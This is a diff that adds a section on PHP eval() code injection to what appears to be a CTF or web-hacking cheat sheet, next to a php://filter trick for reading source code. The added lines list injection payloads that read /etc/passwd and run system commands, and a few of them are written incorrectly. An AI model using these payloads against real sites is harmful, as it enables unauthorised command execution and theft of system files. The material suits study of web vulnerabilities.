@@ -175,7 +175,27 @@ If you found a site with URL like ?file=abc.php
 
 Basically, you can read its source code by ?file=php://filter/convert.base64-encode/abc.php.
 
+#### Eval() Function
 
+If eval() function is spotted in source code, it is highly possible that it can be exploited by code injection. eval() function takes string as input and execute the string as php code. So, if you spotted this, you can try this in input:
+
+```
+phpinfo();
+```
+or 
+```
+<? phpinfo(); ?>
+```
+If the first code upthere can executed properly, the program is vulnerablet to php code injection without tag. The latter one proved that the system is vulnerable to php code injection with tag.
+
+```
+highlight_file('/etc/passwd');
+echo passthru('/etc/passwd');
+system('whoami');
+$a=file_get_content('etc/passwd');print_r($a);
+
+
+```
 
 
 <a name ="flaskcookie"></a>
